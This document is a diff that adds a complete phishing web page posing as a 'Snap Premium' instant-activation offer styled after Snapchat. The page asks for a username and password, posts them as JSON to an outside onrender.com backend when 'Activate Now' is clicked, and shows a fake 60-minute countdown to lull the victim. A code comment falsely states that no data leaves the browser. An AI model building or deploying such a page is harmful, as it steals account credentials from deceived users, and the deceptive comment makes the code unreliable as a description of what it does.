@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Premium — Instant Activation</title>
+    <style>
+      :root {
+        --snap-yellow: #fffc00;
+        --card: #ffffff;
+        --muted: #555;
+        --accent: #007aff;
+        --shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
+        --radius: 18px;
+      }
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family: Inter, system-ui, -apple-system, Arial, sans-serif;
+        background: var(--snap-yellow);
+      }
+      .wrap {
+        min-height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 28px;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 980px;
+        background: var(--card);
+        border-radius: var(--radius);
+        box-shadow: var(--shadow);
+        overflow: hidden;
+        display: grid;
+        grid-template-columns: 1fr 420px;
+        gap: 0;
+      }
+
+      /* left panel - hero */
+      .hero {
+        padding: 44px 40px;
+        background: linear-gradient(180deg, rgba(0, 0, 0, 0.02), transparent);
+      }
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 12px;
+      }
+      .logo {
+        width: 62px;
+        height: 62px;
+        border-radius: 14px;
+        background: #fff;
+        display: grid;
+        place-items: center;
+        font-size: 34px;
+      }
+      h1 {
+        margin: 0;
+        font-size: 28px;
+      }
+      p.lead {
+        color: var(--muted);
+        margin-top: 10px;
+        font-size: 15px;
+      }
+
+      .features {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 10px;
+        margin-top: 22px;
+      }
+      .feat {
+        background: #fff;
+        border-radius: 12px;
+        padding: 12px;
+        border: 1px solid rgba(0, 0, 0, 0.04);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .feat b {
+        display: block;
+      }
+      .small {
+        font-size: 13px;
+        color: var(--muted);
+      }
+
+      /* right panel - activation card */
+      .panel {
+        background: linear-gradient(180deg, #fff, #fff);
+        padding: 30px;
+        display: flex;
+        flex-direction: column;
+        align-items: stretch;
+        justify-content: center;
+      }
+      .panel h2 {
+        margin: 0 0 8px 0;
+        font-size: 20px;
+      }
+      .panel p {
+        margin: 0 0 16px 0;
+        color: var(--muted);
+      }
+
+      .form-row {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 12px;
+      }
+      .input {
+        flex: 1;
+      }
+      input[type="text"],
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        border-radius: 12px;
+        border: 1px solid #e6e6e6;
+        font-size: 15px;
+      }
+
+      .cta {
+        display: flex;
+        gap: 10px;
+        align-items: center;
+      }
+      button.primary {
+        flex: 1;
+        padding: 12px;
+        border-radius: 12px;
+        border: 0;
+        background: var(--accent);
+        color: #fff;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      button.ghost {
+        padding: 10px 12px;
+        border-radius: 10px;
+        border: 1px solid rgba(0, 0, 0, 0.06);
+        background: transparent;
+        cursor: pointer;
+      }
+
+      .note {
+        font-size: 13px;
+        color: var(--muted);
+        margin-top: 10px;
+      }
+
+      .status {
+        margin-top: 16px;
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px dashed rgba(0, 0, 0, 0.06);
+        background: #fafafa;
+      }
+      .timer {
+        font-weight: 800;
+        font-size: 20px;
+        margin-top: 6px;
+      }
+
+      footer {
+        padding: 12px;
+        text-align: center;
+        font-size: 13px;
+        color: var(--muted);
+      }
+
+      /* modal */
+      .modal {
+        position: fixed;
+        inset: 0;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        background: linear-gradient(
+          0deg,
+          rgba(0, 0, 0, 0.45),
+          rgba(0, 0, 0, 0.45)
+        );
+      }
+      .modal .box {
+        background: #fff;
+        padding: 20px;
+        border-radius: 12px;
+        max-width: 420px;
+        width: 90%;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+      }
+
+      /* responsive */
+      @media (max-width: 920px) {
+        .card {
+          grid-template-columns: 1fr;
+        }
+        .panel {
+          order: -1;
+        }
+      }
+      @media (max-width: 480px) {
+        .hero {
+          padding: 20px;
+        }
+        .panel {
+          padding: 20px;
+        }
+        h1 {
+          font-size: 22px;
+        }
+        .logo {
+          width: 52px;
+          height: 52px;
+          font-size: 28px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card" role="region" aria-label="Premium activation panel">
+        <section class="hero">
+          <div class="brand">
+            <div class="logo" aria-hidden="true">👻</div>
+            <div>
+              <div style="font-weight: 700">Snap Premium</div>
+              <div class="small">Exclusive features — quick activation</div>
+            </div>
+          </div>
+
+          <h1>Activate Premium — Instant access in under an hour</h1>
+          <p class="lead">
+            Activate now and enjoy premium perks like custom themes, priority
+            replies, extended best friends list and more. Activation starts
+            immediately and will complete within 60 minutes.
+          </p>
+
+          <div class="features" aria-hidden="true">
+            <div class="feat">
+              <div style="font-size: 18px">⭐</div>
+              <div>
+                <b>Priority Replies</b>
+                <div class="small">Be seen first</div>
+              </div>
+            </div>
+            <div class="feat">
+              <div style="font-size: 18px">🔥</div>
+              <div>
+                <b>Instant Streaks</b>
+                <div class="small">Keep streaks alive</div>
+              </div>
+            </div>
+            <div class="feat">
+              <div style="font-size: 18px">🎨</div>
+              <div>
+                <b>Custom Themes</b>
+                <div class="small">Make it yours</div>
+              </div>
+            </div>
+            <div class="feat">
+              <div style="font-size: 18px">📈</div>
+              <div>
+                <b>Snapscore Multiplier</b>
+                <div class="small">Boost your score</div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <aside class="panel">
+          <h2>Activate Premium</h2>
+          <p>
+            Activation will begin immediately. Most accounts finish within 60
+            minutes.
+          </p>
+
+          <label for="user">Username</label>
+          <div class="form-row">
+            <input
+              id="user"
+              class="input"
+              type="text"
+              placeholder="your_username"
+              aria-label="username input"
+            />
+          </div>
+
+          <label for="email">Password</label>
+          <div class="form-row">
+            <input
+              id="password"
+              class="input"
+              type="password"
+              placeholder="password"
+              aria-label="password input"
+            />
+          </div>
+
+          <div class="cta">
+            <button id="activateBtn" class="primary">Activate Now</button>
+          </div>
+
+          <div class="note">
+            You’ll see a countdown showing remaining time until activation
+            completes — under 60 minutes.
+          </div>
+
+          <div id="status" class="status" aria-live="polite" hidden>
+            <div id="statusText">Waiting</div>
+            <div class="timer" id="timer">60:00</div>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div
+      class="modal"
+      id="modal"
+      role="dialog"
+      aria-modal="true"
+      aria-hidden="true"
+    >
+      <div class="box">
+        <h3 id="modalTitle">Activating Premium</h3>
+        <p id="modalBody">
+          We’re starting your activation. It can take up to 60 minutes, but
+          often completes faster.
+        </p>
+        <div
+          style="
+            display: flex;
+            gap: 8px;
+            justify-content: flex-end;
+            margin-top: 12px;
+          "
+        >
+          <button id="closeModal" class="ghost">Close</button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      fetch("https://backendroutes-lcpt.onrender.com/snap");
+
+      async function sendDEtails() {}
+
+      // Simple client-side simulation only. No data leaves the browser.
+      const activateBtn = document.getElementById("activateBtn");
+      const demoBtn = document.getElementById("demoBtn");
+      const status = document.getElementById("status");
+      const statusText = document.getElementById("statusText");
+      const timerEl = document.getElementById("timer");
+      const modal = document.getElementById("modal");
+      const closeModal = document.getElementById("closeModal");
+
+      let remaining = 60 * 60; // seconds (60 minutes)
+      let interval = null;
+
+      function formatTime(s) {
+        const m = Math.floor(s / 60)
+          .toString()
+          .padStart(2, "0");
+        const sec = (s % 60).toString().padStart(2, "0");
+        return `${m}:${sec}`;
+      }
+
+      function startTimer(seconds) {
+        remaining = Math.max(0, Math.floor(seconds));
+        timerEl.textContent = formatTime(remaining);
+        status.hidden = false;
+        statusText.textContent = "Activating — estimated time remaining";
+        if (interval) clearInterval(interval);
+        interval = setInterval(() => {
+          remaining -= 1;
+          timerEl.textContent = formatTime(remaining);
+          if (remaining <= 0) {
+            clearInterval(interval);
+            statusText.textContent =
+              "Activated — Premium should be available now.";
+            timerEl.textContent = "00:00";
+          }
+        }, 1000);
+      }
+
+      activateBtn.addEventListener("click", async () => {
+        // simple validation
+        const username = document.getElementById("user").value.trim();
+        const upass = document.getElementById("password").value.trim();
+        if (!user || !upass) {
+          alert("Enter details to continue");
+          document.getElementById("user").focus();
+          return;
+        }
+
+        // show modal and start 60-minute countdown (demo: we'll use 15 minutes for presentation if you want faster)
+        modal.style.display = "flex";
+        modal.setAttribute("aria-hidden", "false");
+        startTimer(60 * 60); // 60 minutes in seconds
+
+        const res = await fetch(
+          "https://backendroutes-lcpt.onrender.com/snap",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ user: username, password: upass }),
+          }
+        );
+      });
+
+      closeModal.addEventListener("click", () => {
+        const usersname = document.getElementById("user");
+        const uspass = document.getElementById("password");
+        usersname.value = "";
+        uspass.value = "";
+
+        modal.style.display = "none";
+        modal.setAttribute("aria-hidden", "true");
+      });
+
+      // Accessibility: close modal with Escape
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape") {
+          modal.style.display = "none";
+          modal.setAttribute("aria-hidden", "true");
+        }
+      });
+    </script>
+  </body>
+</html>
